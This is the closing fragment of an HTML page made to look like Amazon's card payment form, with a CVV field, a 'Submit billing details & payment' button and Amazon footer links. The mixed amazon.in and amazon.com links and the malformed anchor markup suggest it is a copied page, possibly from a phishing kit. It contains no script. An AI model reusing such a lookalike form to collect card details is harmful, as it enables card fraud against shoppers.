	  <div class="a-section a-spacing-none pmts-inline-field-block"><label for="pp-KQ-40" class="a-form-label">CVV <a rel="noreferrer" target="_blank" <a="" href="https://www.amazon.in/gp/help/customer/display.html?nodeId=202054760">(What's this?)</a></label><input type="text" maxlength="4" id="pp-KQ-40" autocomplete="off" name="cvv" required="required" class="a-input-text a-form-normal a-width-base"></div><br>

     
     
     
     
     
     
     <span id="pp-KQ-48" class="a-button a-button-primary pmts-button-input"><span class="a-button-inner"><input name="ppw-widgetEvent:AddCreditCardEvent" class="a-button-input" type="submit" aria-labelledby="pp-KQ-48-announce"><span id="pp-KQ-48-announce" class="a-button-text" aria-hidden="true">Submit billing details & payment</span></span></span>
     
     
     






<div class="a-section a-spacing-top-extra-large">
  <div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
  
  <div class="a-section a-spacing-small a-text-center">
    <span class="abbott-footer-links-separator"></span>
    
    <a class="a-size-mini a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
      Conditions of Use
    </a>
    <span class="abbott-footer-links-separator"></span>
    
    <a class="a-size-mini a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
      Privacy Notice
    </a>
    <span class="abbott-footer-links-separator"></span>
    
    <a class="a-size-mini a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/help">
      Help
    </a>
    <span class="abbott-footer-links-separator"></span>
    
  </div>
  
  <div class="a-section a-spacing-none a-text-center">
    <span class="a-size-mini a-color-secondary">
      © 1996-2020, Amazon.com, Inc. or its affiliates.
    </span>
  </div>
</div>
    </div>
  </div></body>
</html>
